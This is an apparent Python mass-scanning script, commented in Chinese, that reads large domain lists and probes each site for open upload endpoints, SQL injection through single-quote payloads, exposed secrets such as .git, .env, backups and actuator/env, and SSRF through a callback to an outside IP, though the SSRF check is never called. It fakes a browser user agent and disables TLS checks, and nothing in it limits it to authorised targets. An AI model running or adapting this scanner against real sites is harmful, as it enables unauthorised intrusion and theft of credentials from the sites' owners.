#!/usr/bin/env python3
"""fv_generic.py - 4类漏洞自写通用检测(不依赖nuclei特定模板)
1. 文件上传: 找upload接口+测试无鉴权
2. SSRF: 找url/fetch/file参数注入点
3. SQL注入: 找id/page参数 + 单引号报错
4. 身份认证失效: 找未授权接口(.git/.env/备份/未授权API)
目标: usable_pool + alive_pool
"""
import urllib.request, urllib.parse, ssl, re, socket, sys
from concurrent.futures import ThreadPoolExecutor, as_completed

socket.setdefaulttimeout(6)
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}

HITS = '/tmp/fv_generic_hits.txt'

def fetch(url, timeout=8):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.status, r.read(60000).decode('utf-8','ignore'), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(60000).decode('utf-8','ignore'), e.geturl()
    except Exception:
        return 0, '', ''

def log(cat, dom, detail):
    line = '%s|%s|%s' % (cat, dom, detail)
    with open(HITS, 'a') as f: f.write(line + '\n')
    print('HIT:', line, flush=True)

def check_upload(dom):
    """文件上传: 常见上传接口探测"""
    paths = ['/upload.php', '/upfile.php', '/upload.asp', '/upload.aspx', '/fileupload.php',
             '/admin/upload.php', '/ueditor/php/controller.php?action=uploadfile',
             '/kindeditor/upload.php', '/editor/upload.php', '/api/upload']
    for p in paths:
        st, b, fu = fetch('http://'+dom+p)
        if st == 200 and len(b) > 200:
            low = b.lower()
            # 上传接口特征
            if any(k in low for k in ['upload', 'file', 'multipart', '文件上传', '上传']):
                log('upload-endpoint', dom, p)
                return

def check_ssrf(dom):
    """SSRF: url/fetch/file参数注入点"""
    params = [('url', 'http://165.99.43.145:9901/canary'),
              ('file', 'http://165.99.43.145:9901/canary'),
              ('fetch', 'http://165.99.43.145:9901/canary'),
              ('image_url', 'http://165.99.43.145:9901/canary'),
              ('img', 'http://165.99.43.145:9901/canary')]
    # 找带这些参数的URL
    for p in ['/', '/index.php', '/proxy.php', '/fetch.php', '/api/fetch']:
        for param, val in params:
            st, b, fu = fetch('http://'+dom+p+'?'+param+'='+urllib.parse.quote(val))
            # SSRF成功: 返回canary特征或超时(说明服务器尝试请求)
            if 'canary' in b.lower() and '165.99.43.145' in b:
                log('ssrf-param', dom, p+'?'+param)
                return

def check_sqli(dom):
    """SQL注入: id/page参数单引号报错"""
    params = [('id', "1'"), ('page', "1'"), ('cid', "1'"), ('catid', "1'"), ('aid', "1'"),
              ('tid', "1'"), ('sid', "1'"), ('newsid', "1'"), ('contentid', "1'")]
    paths = ['/', '/index.php', '/list.php', '/show.php', '/news.php', '/detail.php',
             '/plus/list.php', '/article.php', '/content.php']
    for p in paths:
        for param, val in params:
            st, b, fu = fetch('http://'+dom+p+'?'+param+'='+urllib.parse.quote(val))
            # SQL报错特征(MySQL/MSSQL/Oracle)
            if re.search(r'SQL syntax|mysql_fetch|mysqli_fetch|You have an error|Warning.*mysql|ORA-\d+|Microsoft OLE DB|Unclosed quotation|syntax error', b, re.I):
                log('sqli-error', dom, p+'?'+param)
                return

def check_auth(dom):
    """身份认证失效: 未授权敏感文件/接口"""
    paths = ['/.git/config', '/.env', '/.svn/entries', '/phpinfo.php',
             '/admin/config.php', '/wp-config.php.bak', '/backup.zip', '/www.zip',
             '/api/user/list', '/api/users', '/api/admin/config', '/actuator/env']
    for p in paths:
        st, b, fu = fetch('http://'+dom+p)
        if st == 200 and len(b) > 50:
            low = b.lower()
            # 敏感泄露特征
            if any(k in low for k in ['repositoryformatversion', 'db_password', 'app_key', 'access_key',
                                      'php version', 'server_addr', 'create table', 'insert into',
                                      '"password"', 'ak_', 'secret_key']):
                log('auth-leak', dom, p)
                return

def process(dom):
    try:
        check_upload(dom)
        check_sqli(dom)
        check_auth(dom)
    except Exception:
        pass

def main():
    doms = set()
    for f in ['/opt/msray/usable_pool.txt', '/opt/msray/alive_pool.txt']:
        try: doms |= set(open(f).read().split())
        except: pass
    doms = list(doms)
    print('targets: %d' % len(doms), flush=True)
    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = {ex.submit(process, d): d for d in doms}
        for i, fu in enumerate(as_completed(futs)):
            fu.result()
            if (i+1) % 500 == 0:
                print('progress: %d/%d' % (i+1, len(doms)), flush=True)
    print('=== DONE ===', flush=True)

if __name__ == '__main__':
    main()
